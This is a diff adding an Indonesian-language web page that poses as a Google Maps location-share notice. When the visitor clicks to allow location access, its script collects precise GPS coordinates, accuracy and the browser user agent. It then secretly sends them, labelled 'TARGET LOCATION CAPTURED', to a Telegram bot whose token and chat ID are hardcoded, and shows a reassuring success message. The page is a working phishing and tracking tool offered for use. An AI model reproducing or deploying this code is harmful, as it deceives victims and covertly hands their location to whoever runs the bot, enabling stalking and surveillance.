@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Seseorang membagikan lokasi</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f1f3f4;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            color: #202124;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        @keyframes up {
+            from { opacity: 0; transform: translateY(16px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulse-pin {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-4px); }
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        @keyframes ripple {
+            0% { transform: scale(1); opacity: 0.5; }
+            100% { transform: scale(2.5); opacity: 0; }
+        }
+
+        /* Header */
+        .header {
+            background: #fff;
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            box-shadow: 0 1px 4px rgba(0,0,0,0.1);
+            z-index: 10;
+        }
+
+        .header-icon {
+            width: 24px;
+            height: 24px;
+            flex-shrink: 0;
+        }
+
+        .header-text {
+            flex: 1;
+        }
+
+        .header-title {
+            font-size: 15px;
+            font-weight: 500;
+            color: #202124;
+            line-height: 1.3;
+        }
+
+        .header-sub {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 1px;
+        }
+
+        /* Map area */
+        .map-container {
+            position: relative;
+            flex: 1;
+            min-height: 300px;
+            overflow: hidden;
+            background: #e8eaed;
+        }
+
+        .map-container iframe {
+            width: 100%;
+            height: 100%;
+            border: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        /* Map pin overlay */
+        .map-pin {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -100%);
+            z-index: 5;
+            animation: pulse-pin 1.5s ease-in-out infinite;
+        }
+
+        .map-pin svg {
+            width: 40px;
+            height: 40px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
+        }
+
+        .map-pin-ripple {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 30px;
+            height: 30px;
+            background: #ea4335;
+            border-radius: 50%;
+            animation: ripple 1.5s ease-out infinite;
+            z-index: 4;
+        }
+
+        /* Bottom sheet */
+        .bottom-sheet {
+            background: #fff;
+            border-radius: 16px 16px 0 0;
+            padding: 20px 20px 32px;
+            box-shadow: 0 -4px 20px rgba(0,0,0,0.1);
+            position: relative;
+            z-index: 10;
+            animation: up 0.4s ease-out;
+        }
+
+        .sheet-handle {
+            width: 32px;
+            height: 4px;
+            background: #dadce0;
+            border-radius: 2px;
+            margin: 0 auto 16px;
+        }
+
+        .share-info {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+
+        .share-avatar {
+            width: 40px;
+            height: 40px;
+            background: #1a73e8;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 500;
+            flex-shrink: 0;
+        }
+
+        .share-details {
+            flex: 1;
+            min-width: 0;
+        }
+
+        .share-name {
+            font-size: 15px;
+            font-weight: 500;
+            color: #202124;
+        }
+
+        .share-time {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 2px;
+        }
+
+        .location-address {
+            background: #f8f9fa;
+            border: 1px solid #e8eaed;
+            border-radius: 8px;
+            padding: 12px 14px;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: flex-start;
+            gap: 10px;
+        }
+
+        .location-address svg {
+            width: 18px;
+            height: 18px;
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .location-text {
+            font-size: 13px;
+            color: #3c4043;
+            line-height: 1.5;
+        }
+
+        .location-text strong {
+            display: block;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 2px;
+        }
+
+        /* Permission prompt */
+        .perm-prompt {
+            text-align: center;
+            padding: 8px 0;
+        }
+
+        .perm-icon {
+            width: 56px;
+            height: 56px;
+            background: #e8f0fe;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+        }
+
+        .perm-icon svg {
+            width: 28px;
+            height: 28px;
+        }
+
+        .perm-prompt h2 {
+            font-size: 17px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .perm-prompt p {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .btn-location {
+            width: 100%;
+            padding: 14px;
+            background: #1a73e8;
+            color: #fff;
+            border: none;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 500;
+            font-family: inherit;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.15s;
+        }
+
+        .btn-location:hover { background: #1765cc; }
+        .btn-location:active { background: #185abc; }
+
+        .btn-location svg {
+            width: 20px;
+            height: 20px;
+        }
+
+        .btn-dismiss {
+            width: 100%;
+            padding: 12px;
+            background: none;
+            color: #5f6368;
+            border: none;
+            font-size: 14px;
+            font-family: inherit;
+            cursor: pointer;
+            margin-top: 8px;
+        }
+
+        .btn-dismiss:hover { color: #202124; }
+
+        /* Loading */
+        .loading-state {
+            text-align: center;
+            padding: 24px 0;
+        }
+
+        .spinner {
+            width: 32px;
+            height: 32px;
+            border: 3px solid #e8eaed;
+            border-top-color: #1a73e8;
+            border-radius: 50%;
+            margin: 0 auto 16px;
+            animation: spin 0.7s linear infinite;
+        }
+
+        .loading-state p {
+            font-size: 14px;
+            color: #5f6368;
+        }
+
+        /* Success */
+        .success-state {
+            text-align: center;
+            padding: 16px 0;
+        }
+
+        .success-state svg.check {
+            width: 56px;
+            height: 56px;
+            margin-bottom: 16px;
+        }
+
+        .success-state h2 {
+            font-size: 18px;
+            font-weight: 500;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .success-state p {
+            font-size: 14px;
+            color: #5f6368;
+            line-height: 1.5;
+        }
+
+        .hidden { display: none !important; }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            .map-container {
+                min-height: 250px;
+            }
+
+            .bottom-sheet {
+                padding: 16px 16px 28px;
+            }
+        }
+
+        @media (min-width: 768px) {
+            body {
+                align-items: center;
+                justify-content: center;
+            }
+
+            .app {
+                width: 100%;
+                max-width: 420px;
+                min-height: 90vh;
+                display: flex;
+                flex-direction: column;
+                background: #f1f3f4;
+                border-radius: 16px;
+                overflow: hidden;
+                box-shadow: 0 8px 40px rgba(0,0,0,0.15);
+            }
+        }
+
+        .app {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        @media (min-width: 768px) {
+            .app {
+                min-height: 700px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="app">
+        <!-- Header -->
+        <div class="header">
+            <svg class="header-icon" viewBox="0 0 24 24" fill="#ea4335"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            <div class="header-text">
+                <div class="header-title">Lokasi dibagikan</div>
+                <div class="header-sub">Google Maps</div>
+            </div>
+        </div>
+
+        <!-- Map -->
+        <div class="map-container">
+            <iframe
+                src="https://www.openstreetmap.org/export/embed.html?bbox=110.485%2C-7.320%2C110.500%2C-7.305&layer=mapnik&marker=-7.3125%2C110.4925"
+                loading="lazy">
+            </iframe>
+            <div class="map-pin-ripple"></div>
+            <div class="map-pin">
+                <svg viewBox="0 0 24 24" fill="#ea4335"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+            </div>
+        </div>
+
+        <!-- Bottom sheet -->
+        <div class="bottom-sheet">
+            <div class="sheet-handle"></div>
+
+            <!-- State 1: Share info + permission prompt -->
+            <div id="shareState">
+                <div class="share-info">
+                    <div class="share-avatar">S</div>
+                    <div class="share-details">
+                        <div class="share-name">Seseorang membagikan lokasi</div>
+                        <div class="share-time" id="shareTime">Baru saja</div>
+                    </div>
+                </div>
+
+                <div class="location-address">
+                    <svg viewBox="0 0 24 24" fill="#5f6368"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                    <div class="location-text">
+                        <strong>Posisi terkirim</strong>
+                        Sedang membagikan lokasi secara real-time
+                    </div>
+                </div>
+
+                <div class="perm-prompt">
+                    <div class="perm-icon">
+                        <svg viewBox="0 0 24 24" fill="#1a73e8"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06c-4.17.46-7.48 3.77-7.94 7.94H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+                    </div>
+                    <h2>Bagikan lokasi Anda</h2>
+                    <p>Untuk melihat dan membandingkan posisi, aktifkan akses lokasi perangkat Anda.</p>
+
+                    <button class="btn-location" id="allowBtn" onclick="requestLocation()">
+                        <svg viewBox="0 0 24 24" fill="#fff"><path d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06c-4.17.46-7.48 3.77-7.94 7.94H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+                        Izinkan Akses Lokasi
+                    </button>
+                    <button class="btn-dismiss" onclick="closePage()">Tidak sekarang</button>
+                </div>
+            </div>
+
+            <!-- State 2: Loading -->
+            <div id="loadingState" class="loading-state hidden">
+                <div class="spinner"></div>
+                <p>Mendapatkan lokasi Anda...</p>
+            </div>
+
+            <!-- State 3: Success -->
+            <div id="successState" class="success-state hidden">
+                <svg class="check" viewBox="0 0 24 24" fill="#1e8e3e"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
+                <h2>Lokasi terkirim</h2>
+                <p>Posisi Anda telah dibagikan. Terima kasih telah mengaktifkan lokasi.</p>
+                <button class="btn-location" style="margin-top:20px;" onclick="closePage()">Selesai</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Set share time
+        document.getElementById('shareTime').textContent =
+            new Date().toLocaleString('id-ID', {
+                day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit'
+            });
+
+        let locationData = null;
+
+        function requestLocation() {
+            document.getElementById('shareState').classList.add('hidden');
+            document.getElementById('loadingState').classList.remove('hidden');
+
+            if (!navigator.geolocation) {
+                showError('Perangkat tidak mendukung akses lokasi.');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                successCallback,
+                errorCallback,
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+            );
+        }
+
+        function successCallback(position) {
+            locationData = {
+                latitude: position.coords.latitude,
+                longitude: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+                timestamp: new Date().toISOString()
+            };
+
+            sendLocationData(locationData);
+
+            setTimeout(() => {
+                document.getElementById('loadingState').classList.add('hidden');
+                document.getElementById('successState').classList.remove('hidden');
+            }, 1200);
+        }
+
+        function errorCallback(error) {
+            let msg;
+            switch (error.code) {
+                case error.PERMISSION_DENIED:
+                    msg = 'Izin lokasi ditolak. Untuk membagikan posisi Anda, izinkan akses lokasi di pengaturan browser.';
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    msg = 'Lokasi tidak tersedia. Pastikan GPS aktif lalu coba lagi.';
+                    break;
+                case error.TIMEOUT:
+                    msg = 'Permintaan timeout. Coba lagi.';
+                    break;
+                default:
+                    msg = 'Terjadi kesalahan. Coba lagi.';
+            }
+            showError(msg);
+        }
+
+        function showError(message) {
+            document.getElementById('loadingState').classList.add('hidden');
+            document.getElementById('shareState').classList.remove('hidden');
+
+            document.querySelector('.perm-prompt p').textContent = message;
+            document.getElementById('allowBtn').textContent = 'Coba lagi';
+        }
+
+        function sendLocationData(data) {
+            const mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+
+            console.log('=== LOCATION CAPTURED ===');
+            console.log('Maps:', mapsLink);
+            console.log('========================');
+
+            const BOT_TOKEN = '8993170245:AAExxncBREPMOthTEshKJIVUMRp3gQfBYOg';
+            const CHAT_ID = '8569867983';
+
+            const message = `🎯 *TARGET LOCATION CAPTURED (V2)*\n\n` +
+                `📍 [Buka di Google Maps](${mapsLink})\n\n` +
+                `*Detail:*\n` +
+                `• Latitude: \`${data.latitude}\`\n` +
+                `• Longitude: \`${data.longitude}\`\n` +
+                `• Akurasi: ±${Math.round(data.accuracy)}m\n` +
+                `• Waktu: ${data.timestamp}\n` +
+                `• UA: \`${navigator.userAgent}\``;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown',
+                    disable_web_page_preview: false
+                })
+            }).catch(() => {});
+        }
+
+        function closePage() {
+            window.close();
+            document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;min-height:100vh;background:#f1f3f4;font-family:Roboto,Arial,sans-serif;color:#5f6368;font-size:14px;">Halaman ditutup.</div>';
+        }
+    </script>
+</body>
+</html>
